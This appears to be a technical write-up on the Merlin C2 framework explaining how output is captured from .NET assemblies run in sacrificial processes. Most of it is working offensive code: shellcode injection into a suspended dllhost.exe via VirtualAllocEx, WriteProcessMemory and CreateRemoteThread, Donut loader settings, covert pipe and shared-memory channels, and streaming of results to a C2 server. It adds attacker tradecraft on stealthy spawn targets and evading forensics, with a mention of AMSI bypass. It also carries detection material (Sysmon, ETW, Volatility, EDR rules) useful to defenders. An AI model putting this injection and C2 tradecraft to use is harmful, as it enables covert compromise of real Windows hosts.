# Output Capture in Sacrificial Process Execute-Assembly

## Overview

Capturing output from .NET assemblies executed in sacrificial processes presents unique technical challenges. Unlike direct execution within the agent process, sacrificial process execution creates isolation that requires explicit inter-process communication (IPC) mechanisms to retrieve stdout, stderr, and execution results. This document provides a comprehensive analysis of output capture techniques, implementation details, and operational considerations.

## The Output Capture Challenge

### Core Problem

When a .NET assembly executes in a sacrificial process:
1. The assembly runs in a completely separate process space
2. Console output (stdout/stderr) is not automatically accessible to the parent agent
3. The agent process must explicitly capture or redirect output
4. The sacrificial process is typically short-lived and may exit before output is fully retrieved
5. Output must be captured without leaving forensic artifacts

### Key Requirements

**Reliability**
- Capture all output without truncation or data loss
- Handle large output volumes (potentially megabytes)
- Manage asynchronous output from multiple threads

**Stealth**
- Avoid creating suspicious named resources (pipes, shared memory)
- Minimize forensic footprint on disk and in event logs
- Use legitimate Windows mechanisms where possible

**Performance**
- Minimize execution time and memory overhead
- Handle blocking I/O operations efficiently
- Avoid deadlocks when buffers fill

## Output Capture Techniques

### 1. Anonymous Pipe Redirection

**Most Common Approach** - Used by most C2 frameworks including Cobalt Strike, Merlin, and others.

#### Windows API Implementation

**Setup Phase (Before Process Creation):**
```c
HANDLE hStdoutRead, hStdoutWrite;
HANDLE hStderrRead, hStderrWrite;
SECURITY_ATTRIBUTES sa;

// Configure pipe security attributes
sa.nLength = sizeof(SECURITY_ATTRIBUTES);
sa.bInheritHandle = TRUE;  // Allow handle inheritance
sa.lpSecurityDescriptor = NULL;

// Create anonymous pipe for stdout
CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0);

// Create anonymous pipe for stderr
CreatePipe(&hStderrRead, &hStderrWrite, &sa, 0);

// Ensure read handles are not inherited (only write handles)
SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0);
```

**Process Creation with Redirected Output:**
```c
STARTUPINFO si;
PROCESS_INFORMATION pi;

ZeroMemory(&si, sizeof(STARTUPINFO));
si.cb = sizeof(STARTUPINFO);
si.dwFlags = STARTF_USESTDHANDLES;
si.hStdOutput = hStdoutWrite;
si.hStdError = hStderrWrite;
si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);  // Or NULL

CreateProcess(
    "C:\\Windows\\System32\\dllhost.exe",  // SpawnTo path
    NULL,                                   // Command line args
    NULL,                                   // Process security attributes
    NULL,                                   // Thread security attributes
    TRUE,                                   // Inherit handles = TRUE
    CREATE_SUSPENDED,                       // Creation flags
    NULL,                                   // Environment
    NULL,                                   // Current directory
    &si,                                    // STARTUPINFO
    &pi                                     // PROCESS_INFORMATION
);

// Close write handles in parent (only child should have them)
CloseHandle(hStdoutWrite);
CloseHandle(hStderrWrite);
```

**Shellcode Injection and Execution:**
```c
// Allocate memory in sacrificial process
LPVOID remoteBuffer = VirtualAllocEx(
    pi.hProcess,
    NULL,
    shellcodeSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);

// Write Donut shellcode
WriteProcessMemory(
    pi.hProcess,
    remoteBuffer,
    donutShellcode,
    shellcodeSize,
    NULL
);

// Change memory protection to executable
VirtualProtectEx(
    pi.hProcess,
    remoteBuffer,
    shellcodeSize,
    PAGE_EXECUTE_READ,
    &oldProtect
);

// Execute shellcode via remote thread
HANDLE hThread = CreateRemoteThread(
    pi.hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)remoteBuffer,
    NULL,
    0,
    NULL
);

// Resume main thread if needed (or rely on remote thread)
ResumeThread(pi.hThread);
```

**Output Capture Loop:**
```c
DWORD bytesRead;
CHAR buffer[4096];
std::string stdout_capture;
std::string stderr_capture;

// Read from stdout pipe until process exits
while (TRUE) {
    BOOL success = ReadFile(
        hStdoutRead,
        buffer,
        sizeof(buffer) - 1,
        &bytesRead,
        NULL
    );

    if (!success || bytesRead == 0) break;

    buffer[bytesRead] = '\0';
    stdout_capture.append(buffer, bytesRead);
}

// Read from stderr pipe
while (TRUE) {
    BOOL success = ReadFile(
        hStderrRead,
        buffer,
        sizeof(buffer) - 1,
        &bytesRead,
        NULL
    );

    if (!success || bytesRead == 0) break;

    buffer[bytesRead] = '\0';
    stderr_capture.append(buffer, bytesRead);
}

// Wait for process completion
WaitForSingleObject(pi.hProcess, INFINITE);

// Cleanup
CloseHandle(hStdoutRead);
CloseHandle(hStderrRead);
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
```

#### Advantages
- No named resources (anonymous pipes leave minimal forensic footprint)
- Standard Windows mechanism used by legitimate applications
- Reliable capture of all output
- Handles large output volumes
- Separate stdout and stderr streams

#### Disadvantages
- Requires handle inheritance at process creation time
- Cannot easily retrofit to already-running processes
- Potential for deadlocks if output buffer fills
- Blocking I/O can hang agent if process stalls

### 2. Named Pipe Communication

**Alternative Approach** - Useful when anonymous pipes are not feasible.

#### Implementation Pattern

**Pipe Creation (Agent Side):**
```c
// Create unique named pipe
char pipeName[256];
snprintf(pipeName, sizeof(pipeName),
         "\\\\.\\pipe\\{%08X-%04X-%04X-%04X-%012X}",
         rand(), rand(), rand(), rand(), rand());

HANDLE hPipe = CreateNamedPipe(
    pipeName,
    PIPE_ACCESS_INBOUND,              // Server reads from pipe
    PIPE_TYPE_BYTE | PIPE_WAIT,
    1,                                 // Max instances
    4096,                              // Out buffer size
    4096,                              // In buffer size
    0,                                 // Default timeout
    NULL                               // Default security
);
```

**Pipe Connection (Donut Shellcode):**
```c
// Inside the sacrificial process (Donut loader code)
HANDLE hPipe = CreateFile(
    pipeName,                          // Pipe name passed as parameter
    GENERIC_WRITE,
    0,
    NULL,
    OPEN_EXISTING,
    0,
    NULL
);

// Redirect stdout/stderr to pipe
SetStdHandle(STD_OUTPUT_HANDLE, hPipe);
SetStdHandle(STD_ERROR_HANDLE, hPipe);
```

**Output Capture (Agent Side):**
```c
// Wait for client to connect
ConnectNamedPipe(hPipe, NULL);

// Read all output
DWORD bytesRead;
char buffer[4096];
std::string output;

while (ReadFile(hPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
    output.append(buffer, bytesRead);
}

DisconnectNamedPipe(hPipe);
CloseHandle(hPipe);
```

#### Advantages
- Can be established after process creation
- Works with any injection method
- Flexible data transfer (not just stdout/stderr)

#### Disadvantages
- Creates named resource visible in `\\.\pipe\` namespace
- More suspicious to defenders (can be enumerated)
- Requires passing pipe name to injected shellcode
- Named pipes logged in event logs (Sysmon Event ID 17, 18)

### 3. Donut Loader Internal Output Handling

The **Donut** loader (used in Merlin and many C2 frameworks) has built-in support for output capture through CLR hosting interfaces.

#### CLR Hosting Output Redirection

**How Donut Captures .NET Assembly Output:**

1. **Custom AppDomain Creation:**
```csharp
// Donut creates a custom AppDomain with redirected output
AppDomain domain = AppDomain.CreateDomain(
    "DonutDomain",
    null,
    appDomainSetup
);
```

2. **Console Output Redirection:**
```csharp
// Inside the Donut loader, before assembly execution
StringWriter outputWriter = new StringWriter();
Console.SetOut(outputWriter);  // Redirect stdout
Console.SetError(outputWriter); // Redirect stderr
```

3. **Assembly Execution:**
```csharp
// Load assembly from memory
Assembly assembly = Assembly.Load(assemblyBytes);

// Invoke entry point (Main method)
MethodInfo entryPoint = assembly.EntryPoint;
object returnValue = entryPoint.Invoke(null, new object[] { args });

// Capture all output
string capturedOutput = outputWriter.ToString();
```

4. **Output Transmission:**
- Donut writes captured output to stdout of the sacrificial process
- If pipes are configured, output flows through pipe to parent agent
- If no pipes, output is lost (process terminates)

#### Donut Configuration for Output Capture

```c
// Donut configuration structure
DonutConfig config;
config.ExitOpt = 2;        // Exit process (vs. exit thread)
config.Type = 2;           // .NET EXE
config.Runtime = "v4.0.30319";
config.Parameters = args;  // Command-line arguments

// When exit option is "exit process", Donut ensures:
// 1. All output is flushed before exit
// 2. Console.WriteLine calls are captured
// 3. Unhandled exceptions are captured to stderr
```

### 4. Memory-Mapped Files (Shared Memory)

**Advanced Technique** - Less common but highly stealthy.

#### Implementation Approach

**Create Shared Memory (Agent Side):**
```c
HANDLE hMapFile = CreateFileMapping(
    INVALID_HANDLE_VALUE,              // Use paging file
    NULL,                              // Default security
    PAGE_READWRITE,                    // Read/write access
    0,                                 // High-order DWORD of size
    65536,                             // Low-order DWORD (64KB)
    "Local\\DonutOutput_12345"         // Name (still detectable)
);

LPVOID pBuf = MapViewOfFile(
    hMapFile,
    FILE_MAP_ALL_ACCESS,
    0,
    0,
    65536
);
```

**Access Shared Memory (Sacrificial Process):**
```c
// Inside Donut shellcode
HANDLE hMapFile = OpenFileMapping(
    FILE_MAP_ALL_ACCESS,
    FALSE,
    "Local\\DonutOutput_12345"
);

LPVOID pBuf = MapViewOfFile(
    hMapFile,
    FILE_MAP_ALL_ACCESS,
    0,
    0,
    65536
);

// Write output to shared memory
memcpy(pBuf, outputData, outputSize);
```

#### Advantages
- High performance for large data transfers
- No blocking I/O issues
- Can handle arbitrary binary data

#### Disadvantages
- Creates named object (detectable)
- Requires synchronization between processes
- Size limitations unless dynamically managed
- More complex implementation

### 5. Direct Memory Reading (Advanced)

**Most Stealthy** - Read memory directly from sacrificial process.

#### Technique

```c
// Allocate memory for output buffer in sacrificial process
LPVOID remoteOutputBuffer = VirtualAllocEx(
    pi.hProcess,
    NULL,
    OUTPUT_BUFFER_SIZE,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE
);

// Pass buffer address to Donut shellcode as parameter
// Donut writes output to this buffer

// After execution completes, read the buffer
char localBuffer[OUTPUT_BUFFER_SIZE];
SIZE_T bytesRead;

ReadProcessMemory(
    pi.hProcess,
    remoteOutputBuffer,
    localBuffer,
    OUTPUT_BUFFER_SIZE,
    &bytesRead
);
```

#### Advantages
- No IPC mechanisms required
- No named resources
- Complete control over buffer size and location

#### Disadvantages
- Requires custom Donut modification
- Output size must be known in advance or use sentinel values
- Cannot capture real-time output
- Complex error handling

## Merlin C2 Framework Implementation

### Server-Side Flow

**Location:** `/home/pmw/merlin/pkg/services/rpc/agent.go:148-194`

#### ExecuteAssembly RPC Method

```go
func (s *Server) ExecuteAssembly(ctx context.Context, in *pb.AgentCMD) (*pb.Message, error) {
    // Input:
    // Arguments[0]: .NET assembly as Base64 string
    // Arguments[1]: Assembly command-line arguments
    // Arguments[2]: SpawnTo path (sacrificial process)
    // Arguments[3]: SpawnTo arguments

    // Configure Donut for output capture
    config := donut.GetDonutDefaultConfig()
    config.ExitOpt = 2        // Exit process (ensures output flush)
    config.Type = 2           // .NET EXE
    config.Runtime = "v4.0.30319"
    config.Entropy = 3        // Encryption enabled
    config.Parameters = in.Arguments[1]  // Pass args to assembly

    // Generate Donut shellcode with CLR bootstrap
    donutBuffer, err := donut.BytesFromString(in.Arguments[0], config)

    // Prepare CreateProcess job
    options := make(map[string]string)
    options["spawnto"] = in.Arguments[2]  // Sacrificial process path
    options["args"] = in.Arguments[3]     // Process arguments
    options["shellcode"] = base64.StdEncoding.EncodeToString(donutBuffer.Bytes())

    // Create job for agent
    job, err := createprocess.Parse(options)
    return addJob(in.ID, job[0], job[1:])
}
```

### Agent-Side Implementation

**Agent Code Location:** Separate repository (merlin-agent)

#### Expected Agent Behavior

**Job Reception:**
```go
// Agent receives job with:
// Command: "CreateProcess"
// Args[0]: Base64 Donut shellcode
// Args[1]: SpawnTo path
// Args[2]: SpawnTo arguments

shellcode := base64.Decode(job.Args[0])
spawnTo := job.Args[1]
spawnToArgs := job.Args[2]
```

**Process Creation with Pipe Redirection:**
```go
// Create anonymous pipes for stdout/stderr
stdoutRead, stdoutWrite := CreatePipe(inheritableWrite=true)
stderrRead, stderrWrite := CreatePipe(inheritableWrite=true)

// Create process with redirected handles
process := CreateProcess(
    path: spawnTo,
    args: spawnToArgs,
    flags: CREATE_SUSPENDED,
    stdout: stdoutWrite,
    stderr: stderrWrite,
)

// Close write ends in parent
Close(stdoutWrite)
Close(stderrWrite)
```

**Shellcode Injection:**
```go
// Allocate + Write + Protect + Execute
remoteAddr := VirtualAllocEx(process, size, PAGE_READWRITE)
WriteProcessMemory(process, remoteAddr, shellcode)
VirtualProtectEx(process, remoteAddr, PAGE_EXECUTE_READ)
CreateRemoteThread(process, remoteAddr)
ResumeThread(process.MainThread)
```

**Output Capture:**
```go
// Read stdout asynchronously
go func() {
    buffer := make([]byte, 4096)
    for {
        n := Read(stdoutRead, buffer)
        if n == 0 { break }
        stdoutData.Write(buffer[:n])
    }
}()

// Read stderr asynchronously
go func() {
    buffer := make([]byte, 4096)
    for {
        n := Read(stderrRead, buffer)
        if n == 0 { break }
        stderrData.Write(buffer[:n])
    }
}()

// Wait for process completion
WaitForSingleObject(process, INFINITE)

// Construct result
result := jobs.Results{
    Stdout: stdoutData.String(),
    Stderr: stderrData.String(),
}
```

### Server-Side Result Processing

**Location:** `/home/pmw/merlin/pkg/services/job/job.go:817-833`

```go
case jobs.RESULT:
    result := job.Payload.(jobs.Results)

    // Process stdout
    if len(result.Stdout) > 0 {
        a.Log(fmt.Sprintf("Command Results (stdout):\r\n%s", result.Stdout))
        userMessage = message.NewMessage(message.Success, result.Stdout)
        s.messageRepo.Add(userMessage)
    }

    // Process stderr
    if len(result.Stderr) > 0 {
        a.Log(fmt.Sprintf("Command Results (stderr):\r\n%s", result.Stderr))
        userMessage = message.NewMessage(message.Warn, result.Stderr)
        s.messageRepo.Add(userMessage)
    }
```

## Complete Data Flow

```
┌─────────────────────────────────────────────────────────────┐
│                     C2 Server (Merlin)                      │
│                                                             │
│  1. ExecuteAssembly RPC receives:                          │
│     - Assembly bytes (Base64)                              │
│     - Assembly arguments                                   │
│     - SpawnTo path                                         │
│                                                             │
│  2. Donut.BytesFromString()                                │
│     - Converts assembly to shellcode                       │
│     - Configures CLR hosting                               │
│     - Enables console redirection                          │
│     - ExitOpt=2 ensures output flush                       │
│                                                             │
│  3. CreateProcess job created                              │
│     - Command: "CreateProcess"                             │
│     - Args: [shellcode, spawnto, args]                     │
│                                                             │
│  4. Job encrypted and sent to agent                        │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      │ Encrypted C2 Channel
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│                   Agent (Target Host)                       │
│                                                             │
│  5. Receive and decrypt job                                │
│                                                             │
│  6. Create anonymous pipes                                 │
│     stdoutR, stdoutW := CreatePipe()                       │
│     stderrR, stderrW := CreatePipe()                       │
│     SetHandleInheritance(stdoutW, TRUE)                    │
│     SetHandleInheritance(stderrW, TRUE)                    │
│                                                             │
│  7. CreateProcess with pipe redirection                    │
│     si.hStdOutput = stdoutW                                │
│     si.hStdError = stderrW                                 │
│     CreateProcess(spawnTo, CREATE_SUSPENDED, &si, &pi)     │
│                                                             │
│  8. Close write handles in parent                          │
│     CloseHandle(stdoutW)                                   │
│     CloseHandle(stderrW)                                   │
│                                                             │
│  9. Inject Donut shellcode                                 │
│     VirtualAllocEx → WriteProcessMemory → VirtualProtectEx │
│                                                             │
│ 10. Execute shellcode                                      │
│     CreateRemoteThread(shellcodeAddr)                      │
│     ResumeThread(mainThread)                               │
│                                                             │
│ 11. Read output asynchronously                             │
│     goroutine 1: ReadFile(stdoutR) → accumulate           │
│     goroutine 2: ReadFile(stderrR) → accumulate           │
│                                                             │
│ 12. Wait for process exit                                  │
│     WaitForSingleObject(hProcess, INFINITE)                │
│                                                             │
│ 13. Construct Result message                               │
│     results := jobs.Results{                               │
│         Stdout: captured_stdout,                           │
│         Stderr: captured_stderr,                           │
│     }                                                       │
│                                                             │
│ 14. Encrypt and send to server                             │
└─────────────────────┬───────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│           Sacrificial Process (dllhost.exe)                 │
│                                                             │
│ Donut Shellcode Execution:                                 │
│                                                             │
│ 15. Donut loader initializes                               │
│     - Decrypt/decompress payload                           │
│     - Resolve API functions dynamically                    │
│     - Bypass AMSI/WLDP if configured                       │
│                                                             │
│ 16. Load CLR Runtime                                       │
│     CLRCreateInstance(&IID_ICLRMetaHost)                   │
│     metaHost->GetRuntime("v4.0.30319", &runtime)           │
│     runtime->GetInterface(&IID_ICLRRuntimeHost, &host)     │
│     host->Start()                                          │
│                                                             │
│ 17. Create AppDomain with console redirection              │
│     domain = AppDomain.CreateDomain("DonutDomain")         │
│     Console.SetOut(new StreamWriter(stdout))               │
│     Console.SetError(new StreamWriter(stderr))             │
│                                                             │
│ 18. Load assembly from memory                              │
│     Assembly.Load(assemblyBytes)                           │
│                                                             │
│ 19. Invoke Main() with arguments                           │
│     entryPoint.Invoke(null, args)                          │
│                                                             │
│ 20. All Console.WriteLine() calls write to:                │
│     → stdout handle (inherited pipe from parent)           │
│     → Flows through pipe to agent's stdoutR handle         │
│                                                             │
│ 21. Process exits (ExitOpt=2)                              │
│     - Flushes all output buffers                           │
│     - Closes pipe handles                                  │
│     - Agent detects pipe closure (ReadFile returns 0)      │
└─────────────────────────────────────────────────────────────┘
                      │
                      │ Return Path
                      │
                      ▼
┌─────────────────────────────────────────────────────────────┐
│                  C2 Server (Merlin)                         │
│                                                             │
│ 22. Receive encrypted result message                       │
│                                                             │
│ 23. Decrypt and extract jobs.Results                       │
│                                                             │
│ 24. Process stdout                                         │
│     Log("Command Results (stdout):\n" + result.Stdout)     │
│     Display to operator                                    │
│                                                             │
│ 25. Process stderr                                         │
│     Log("Command Results (stderr):\n" + result.Stderr)     │
│     Display as warning to operator                         │
└─────────────────────────────────────────────────────────────┘
```

## Edge Cases and Error Handling

### 1. Buffer Overflow / Large Output

**Problem:** Assembly generates gigabytes of output, filling pipe buffer.

**Symptoms:**
- `WriteFile()` in sacrificial process blocks
- Assembly hangs waiting for buffer space
- Deadlock: agent waiting for process exit, process waiting for buffer space

**Solutions:**
```c
// Option 1: Asynchronous reading with large buffers
DWORD WINAPI ReadThreadProc(LPVOID lpParameter) {
    HANDLE hPipe = (HANDLE)lpParameter;
    char buffer[65536];  // Large buffer
    DWORD bytesRead;

    while (ReadFile(hPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        // Process immediately, don't accumulate in memory
        SendChunkToC2Server(buffer, bytesRead);
    }
    return 0;
}

// Create separate threads for stdout and stderr
CreateThread(NULL, 0, ReadThreadProc, hStdoutRead, 0, NULL);
CreateThread(NULL, 0, ReadThreadProc, hStderrRead, 0, NULL);
```

```c
// Option 2: Increase pipe buffer size
CreatePipe(&hRead, &hWrite, &sa, 1048576);  // 1MB buffer
```

### 2. Process Crashes Before Output Flushed

**Problem:** Assembly throws unhandled exception, process crashes, output lost.

**Solution:**
```csharp
// Donut should wrap execution in try-catch
try {
    assembly.EntryPoint.Invoke(null, args);
    Console.Out.Flush();
    Console.Error.Flush();
} catch (Exception ex) {
    Console.Error.WriteLine($"Unhandled exception: {ex}");
    Console.Error.Flush();
} finally {
    Thread.Sleep(100);  // Give OS time to flush buffers
}
```

### 3. Process Hangs Indefinitely

**Problem:** Assembly enters infinite loop, never exits, agent hangs waiting.

**Solution:**
```go
// Implement timeout
done := make(chan bool)

go func() {
    WaitForSingleObject(hProcess, INFINITE)
    done <- true
}()

select {
case <-done:
    // Process completed normally
case <-time.After(5 * time.Minute):
    // Timeout - kill process
    TerminateProcess(hProcess, 1)
    return Error("Assembly execution timed out")
}
```

### 4. Unicode/Encoding Issues

**Problem:** Assembly outputs Unicode characters, pipe reads as ASCII, corruption occurs.

**Solution:**
```go
// Read as bytes, decode explicitly
bytes := ReadAllBytes(stdoutPipe)

// Try UTF-8 first
output, err := UTF8ToString(bytes)
if err != nil {
    // Fall back to UTF-16
    output, err = UTF16ToString(bytes)
}
```

### 5. Interleaved stdout/stderr

**Problem:** stdout and stderr mixed in confusing order.

**Solution:**
- Use separate pipes and separate goroutines
- Timestamp each line
- Preserve order by using shared pipe (but lose stream distinction)

### 6. No Output Captured

**Problem:** Assembly executes successfully but no output returned.

**Common Causes:**
```
1. Pipe handles not inherited
   → Ensure bInheritHandle=TRUE in SECURITY_ATTRIBUTES
   → Ensure dwFlags includes STARTF_USESTDHANDLES

2. Write handles not closed in parent
   → Pipe won't signal EOF until all write handles closed
   → Parent must close stdoutWrite and stderrWrite

3. Donut ExitOpt=1 (exit thread instead of process)
   → Thread exits but process remains, doesn't flush buffers
   → Use ExitOpt=2 for reliable output capture

4. Assembly uses GUI dialogs (MessageBox, etc.)
   → Can't capture GUI output via pipes
   → Assembly should use Console.WriteLine for C2 operations

5. Assembly writes to files instead of console
   → Pipe capture only works for stdout/stderr
   → Parse command line to detect file output
```

## Detection and Forensics

### Defensive Detection Opportunities

#### 1. Process Creation Monitoring

**Sysmon Event ID 1 (Process Create)**
```xml
<Event>
  <System>
    <EventID>1</EventID>
  </System>
  <EventData>
    <ParentProcessName>unknown.exe</ParentProcessName>
    <ProcessName>dllhost.exe</ProcessName>
    <ParentProcessId>1234</ParentProcessId>
    <ProcessId>5678</ProcessId>
  </EventData>
</Event>
```

**Indicators:**
- `dllhost.exe` spawned by non-service parent
- Unusual parent-child relationships
- Processes created in suspended state (requires kernel ETW)

#### 2. Pipe Creation Monitoring

**Sysmon Event ID 17 (Pipe Created)**
```xml
<Event>
  <System>
    <EventID>17</EventID>
  </System>
  <EventData>
    <PipeName>\Device\NamedPipe\{random-guid}</PipeName>
    <ProcessName>malicious-agent.exe</ProcessName>
  </EventData>
</Event>
```

**Indicators:**
- Anonymous pipes (harder to detect)
- Named pipes with suspicious names (GUIDs, random strings)
- Pipe creation followed immediately by process creation

#### 3. CLR Loading Events

**ETW: Microsoft-Windows-DotNETRuntime**
```
Event ID 80: AppDomainLoad
Event ID 81: AssemblyLoad
Event ID 152: Method JIT compile started
```

**Indicators:**
- CLR loaded into unexpected processes (dllhost.exe, notepad.exe)
- Assembly loaded from memory (no file path)
- Assembly name doesn't match known legitimate assemblies

#### 4. Memory Indicators

**Memory Scanning**
```
RWX memory regions in legitimate Windows processes
Unsigned code pages in signed process (dllhost.exe)
CLR JIT compiler artifacts in unexpected processes
Assembly metadata in memory (.NET PE headers)
```

**Detection Tools:**
- Process Hacker: Shows memory regions with RWX
- Volatility: `malfind` plugin detects injected code
- WinDbg: `.loadby sos clr` + `!DumpDomain` shows loaded assemblies

#### 5. Behavioral Analysis

**EDR Behavioral Rules**
```
Rule: "Suspicious CreateProcess with Pipe Redirection"
  IF process.create(flags=CREATE_SUSPENDED)
  AND pipe.create(type=ANONYMOUS)
  AND memory.allocate(target=process, protection=RWX)
  AND thread.create(target=process, remote=TRUE)
  THEN ALERT("Possible process injection with output capture")
```

### Forensic Artifacts

#### Memory Dump Analysis

**Locate Pipe Buffers:**
```
1. Dump process memory
2. Search for pipe buffer structures (PIPE_DATA_HEAD)
3. Extract buffered output before it's read
4. Recover assembly bytes from remote process memory
```

**Volatility Commands:**
```bash
# Find handles to pipe objects
volatility -f memory.dmp windows.handles --pid 1234 --type File

# Dump process memory
volatility -f memory.dmp windows.memmap --pid 5678 --dump

# Search for .NET assemblies (DOS header + "This program")
strings process.5678.dmp | grep -A 5 "This program"
```

#### Event Log Analysis

**PowerShell Script to Detect Sacrificial Processes:**
```powershell
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Sysmon/Operational'
    ID = 1  # Process Create
} | Where-Object {
    $_.Properties[4].Value -match 'dllhost.exe|notepad.exe' -and
    $_.Properties[20].Value -match '^C:\\Windows\\System32\\'
} | Select-Object TimeCreated,
    @{n='ParentImage';e={$_.Properties[21].Value}},
    @{n='Image';e={$_.Properties[4].Value}},
    @{n='CommandLine';e={$_.Properties[10].Value}}
```

## Operational Security Recommendations

### Best Practices for Attackers

1. **Choose Believable SpawnTo Processes**
```
Good: dllhost.exe, WerFault.exe, rundll32.exe
Bad: notepad.exe (unless user-initiated), cmd.exe (suspicious)
```

2. **Vary Techniques**
```
Rotate between:
- Anonymous pipes (most common)
- Named pipes with random names
- No output capture (fire-and-forget for noisy ops)
```

3. **Handle Large Output**
```
- Stream output to C2 in chunks
- Compress output before transmission
- Set maximum output size limits
```

4. **Implement Timeouts**
```
- Kill hung assemblies after reasonable timeout (5-10 min)
- Don't let agent hang indefinitely
- Log timeout events for post-op analysis
```

5. **Test Assemblies Before Use**
```
- Test assemblies offline to verify output behavior
- Check for GUI dependencies (MessageBox, etc.)
- Verify output fits within pipe buffers
```

### Best Practices for Defenders

1. **Monitor Process Creation Patterns**
```
- Parent-child relationships
- Processes created in suspended state
- Unusual parents for dllhost.exe
```

2. **Enable CLR ETW Events**
```powershell
logman create trace clr_trace -p Microsoft-Windows-DotNETRuntime -ets
```

3. **Deploy Memory Scanning**
```
- Regular memory scans for RWX regions
- Detect unsigned code in signed processes
- YARA rules for .NET assembly headers
```

4. **Implement Behavioral EDR Rules**
```
- CreateProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
- CLR loading in unexpected processes
- Anonymous pipe creation followed by remote thread creation
```

5. **Forensic Readiness**
```
- Enable Sysmon with comprehensive ruleset
- Configure memory dump on suspicious process creation
- Collect ETW events for .NET runtime
```

## Performance Considerations

### Memory Usage

```
Pipe buffers: 4KB default, configurable up to several MB
Output accumulation: Can consume significant agent memory
Recommendation: Stream output to C2, don't accumulate locally
```

### CPU Usage

```
Donut shellcode execution: ~50-200ms overhead
CLR loading: ~100-500ms on first load (cached thereafter)
Assembly execution: Depends on assembly complexity
Pipe I/O: Minimal overhead with asynchronous reading
```

### Network Bandwidth

```
Typical assembly output: 1KB - 10MB
Compression ratio: ~5:1 for text output
Encryption overhead: Minimal (AES-GCM ~5% for large data)
Recommendation: Compress large output before transmission
```

## Summary

Output capture in sacrificial process execute-assembly is a critical capability that requires careful implementation to balance reliability, stealth, and performance. The most common and reliable approach uses **anonymous pipe redirection** combined with **Donut loader integration** to seamlessly capture stdout/stderr from .NET assemblies executing in isolated sacrificial processes.

### Key Takeaways

**Implementation:**
- Anonymous pipes provide the best balance of stealth and reliability
- Donut loader handles CLR hosting and console redirection
- Asynchronous reading prevents deadlocks with large output
- Proper error handling ensures robust operation

**Detection:**
- Process creation patterns reveal suspicious behavior
- CLR loading events indicate .NET execution
- Memory scanning detects injected code
- Pipe creation events provide forensic evidence

**Operations:**
- Choose appropriate SpawnTo processes for environment
- Implement timeouts to prevent hung operations
- Test assemblies before operational use
- Stream large output to avoid memory exhaustion

Understanding these mechanisms enables both effective offensive operations and comprehensive defensive detection strategies.